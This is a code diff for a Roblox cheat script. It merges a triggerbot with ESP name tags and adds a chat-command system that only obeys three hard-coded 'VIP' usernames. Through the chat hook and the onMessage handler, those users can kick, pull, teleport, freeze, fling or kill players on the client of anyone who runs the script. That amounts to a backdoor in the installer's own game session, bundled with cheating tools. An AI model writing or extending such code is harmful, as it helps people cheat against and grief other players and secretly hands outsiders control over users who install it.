@@ -1,4 +1,193 @@
--- Standalone Ultra Fast TriggerBot System
+-- 🔴 Unified Roblox Script: ESP, Triggerbot, and VIP Commands
+
+-- Core Roblox services
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Camera = workspace.CurrentCamera
+
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+
+-- Script-wide settings and data structures
+-- Add or remove VIP users here. The script will automatically check for case-insensitive matches.
+local VIPUsers = { "draconvm", "K3TCHUPSS", "EnvyKyurai" }
+local BringTargets = {}
+local FrozenPlayers = {}
+local targetedPlayers = {} -- Stores players targeted by the .h command
+local espObjects = {}
+local lastTargetedPlayerName = nil -- Tracks the last player targeted
+
+
+--[[ 
+    -- VIP-related functions --
+]]
+local function teleportToPlayer(targetName)
+    local targetPlayer = Players:FindFirstChild(targetName)
+    local myChar = LocalPlayer.Character
+    if targetPlayer and targetPlayer.Character and myChar then
+        local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+        local myRoot = myChar:FindFirstChild("HumanoidRootPart")
+        if targetRoot and myRoot then
+            myRoot.CFrame = targetRoot.CFrame + Vector3.new(0,3,0)
+        end
+    end
+end
+
+local function freezeAllPlayers(senderName)
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Character and player.Name ~= senderName and not FrozenPlayers[player.Name] then
+            local root = player.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                root.Anchored = true
+                FrozenPlayers[player.Name] = true
+            end
+        end
+    end
+end
+
+local function unfreezeAllPlayers(senderName)
+    for name, _ in pairs(FrozenPlayers) do
+        if name ~= senderName then
+            local player = Players:FindFirstChild(name)
+            if player and player.Character then
+                local root = player.Character:FindFirstChild("HumanoidRootPart")
+                if root then
+                    root.Anchored = false
+                end
+            end
+            FrozenPlayers[name] = nil
+        end
+    end
+end
+
+local function killAllOtherPlayers(senderName)
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name ~= senderName then
+            local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.Health = 0
+            end
+        end
+    end
+end
+
+-- FLING FUNCTION (STRONG)
+local function flingPlayer(player)
+    if player.Character then
+        local root = player.Character:FindFirstChild("HumanoidRootPart")
+        if root then
+            local bodyVelocity = Instance.new("BodyVelocity")
+            bodyVelocity.Velocity = Vector3.new(math.random(-1500,1500), 800, math.random(-1500,1500))
+            bodyVelocity.MaxForce = Vector3.new(1e6,1e6,1e6)
+            bodyVelocity.P = 1e5
+            bodyVelocity.Parent = root
+            task.delay(0.3, function() bodyVelocity:Destroy() end)
+        end
+    end
+end
+
+--[[
+    -- ESP-related functions --
+    These functions handle the creation and removal of ESP objects.
+]]
+local function addESP(targetPlayer, color)
+    local character = targetPlayer.Character
+    if not character or not character:FindFirstChild("Humanoid") then 
+        return
+    end
+
+    if espObjects[targetPlayer] then
+        return
+    end
+
+    local head = character:FindFirstChild("Head")
+    if head then
+        local nameTag = Instance.new("BillboardGui")
+        nameTag.Name = "ESP_NameTag"
+        nameTag.AlwaysOnTop = true
+        nameTag.Size = UDim2.new(0, 100, 0, 20)
+        nameTag.StudsOffset = Vector3.new(0, 2, 0)
+        nameTag.Adornee = head
+        
+        local nameLabel = Instance.new("TextLabel")
+        nameLabel.Name = "Name"
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.Size = UDim2.new(1, 0, 1, 0)
+        nameLabel.TextColor3 = color
+        nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        nameLabel.TextStrokeTransparency = 0.8
+        nameLabel.TextScaled = true
+        nameLabel.Font = Enum.Font.SourceSansBold
+        nameLabel.Text = targetPlayer.Name
+        nameLabel.Parent = nameTag
+        
+        nameTag.Parent = character
+        espObjects[targetPlayer] = nameTag
+    end
+end
+
+local function removeESP(targetPlayer)
+    if espObjects[targetPlayer] then
+        espObjects[targetPlayer]:Destroy()
+        espObjects[targetPlayer] = nil
+    end
+end
+
+local function getColorForPlayer(player)
+    -- You can add custom logic here for team colors if needed.
+    return Color3.fromRGB(255, 255, 255)
+end
+
+--[[
+    -- Main loops --
+]]
+
+-- Main ESP loop
+task.spawn(function()
+    while task.wait() do
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                local shouldHaveESP = targetedPlayers[player.Name]
+
+                if shouldHaveESP then
+                    if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+                        local espColor = getColorForPlayer(player)
+                        addESP(player, espColor)
+                    else
+                        removeESP(player)
+                    end
+                else
+                    removeESP(player)
+                end
+            end
+        end
+    end
+end)
+
+
+-- SMOOTH BRING LOOP
+RunService.RenderStepped:Connect(function()
+    for targetName, _ in pairs(BringTargets) do
+        local targetPlayer = Players:FindFirstChild(targetName)
+        for _, vipName in ipairs(VIPUsers) do
+            local vipPlayer = Players:FindFirstChild(vipName)
+            if vipPlayer and vipPlayer.Character and targetPlayer and targetPlayer.Character and targetPlayer ~= vipPlayer then
+                local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
+                local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if vipRoot and targetRoot then
+                    local direction = (vipRoot.Position + Vector3.new(0,3,0) - targetRoot.Position)
+                    targetRoot.CFrame = targetRoot.CFrame + direction * 0.25
+                end
+            end
+        end
+    end
+end)
+
+--[[
+    -- Triggerbot System --
+]]
 local TriggerBot = {
     Enabled = false,
     Connections = {},
@@ -7,16 +196,10 @@ local TriggerBot = {
 
 -- Configuration
 TriggerBot.Settings = {
-    Keybind = 'Q',
+    Keybind = Enum.KeyCode.Q, -- Use Enum.KeyCode directly
     Prediction = 0.01,
     Blacklisted = {"Knife"}
 }
-
--- Services
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local Mouse = Players.LocalPlayer:GetMouse()
 
 -- Pre-cache blacklisted items
 for _, itemName in ipairs(TriggerBot.Settings.Blacklisted) do
@@ -107,8 +290,8 @@ end
 local function HandleInput(input, gameProcessed)
     if gameProcessed then return end
     
-    if input.UserInputType == Enum.UserInputType.Keyboard and 
-       input.KeyCode == Enum.KeyCode[TriggerBot.Settings.Keybind] then
+    if input.UserInputType == Enum.UserInputType.Keyboard and
+        input.KeyCode == TriggerBot.Settings.Keybind then
         TriggerBot:Toggle()
     end
 end
@@ -124,3 +307,95 @@ getgenv().DisableTriggerBot = function()
     end
     TriggerBot.Enabled = false
 end
+
+--[[
+    -- Chat command handler --
+    All chat commands are handled here. New ESP commands are added.
+]]
+local function onMessage(senderName, message)
+    local isVIP = false
+    for _, vipName in ipairs(VIPUsers) do
+        if senderName:lower() == vipName:lower() then
+            isVIP = true
+            break
+        end
+    end
+
+    if not isVIP then
+        return
+    end
+
+    local args = message:split(" ")
+    local command = args[1]:lower()
+
+    if command == ".h" then
+        local targetName = args[2]
+        if targetName then
+            local target = Players:FindFirstChild(targetName)
+            if target then
+                targetedPlayers[target.Name] = true
+                lastTargetedPlayerName = target.Name
+                print("ESP enabled for " .. target.Name)
+            else
+                print("Player not found: " .. targetName)
+            end
+        else
+            print("Missing player name. Usage: .h <playername>")
+        end
+    elseif command == ".j" then
+        local targetName = args[2]
+        if targetName then
+            if targetedPlayers[targetName] then
+                targetedPlayers[targetName] = nil
+                print("ESP disabled for " .. targetName)
+            else
+                print("ESP is not currently active for " .. targetName)
+            end
+        elseif lastTargetedPlayerName and targetedPlayers[lastTargetedPlayerName] then
+            targetedPlayers[lastTargetedPlayerName] = nil
+            print("ESP disabled for " .. lastTargetedPlayerName .. " (last targeted player)")
+            lastTargetedPlayerName = nil
+        else
+            print("No specific player provided, and no last targeted player to remove ESP from.")
+        end
+    -- New VIP commands
+    elseif command == ".k" and LocalPlayer.Name:lower() ~= senderName:lower() then
+        LocalPlayer:Kick("Kicked by VIP")
+    elseif command == ".g" then
+        if LocalPlayer.Name ~= senderName then
+            BringTargets[LocalPlayer.Name] = true
+        end
+    elseif command == ".s" then
+        BringTargets[LocalPlayer.Name] = nil
+    elseif command == ".f" then
+        freezeAllPlayers(senderName)
+    elseif command == ".u" then
+        unfreezeAllPlayers(senderName)
+    elseif command == ".tp" and args[2] then
+        if LocalPlayer.Name ~= senderName then
+            teleportToPlayer(args[2])
+        end
+    elseif command == ".fling" then
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player.Name ~= senderName then
+                flingPlayer(player)
+            end
+        end
+    elseif command == ".r" then
+        if LocalPlayer.Name ~= senderName then
+            killAllOtherPlayers(senderName)
+        end
+    end
+end
+
+--[[ 
+    -- Chat Hooks --
+]]
+local function hookPlayer(plr)
+    plr.Chatted:Connect(function(msg)
+        onMessage(plr.Name, msg)
+    end)
+end
+
+for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
+Players.PlayerAdded:Connect(hookPlayer)
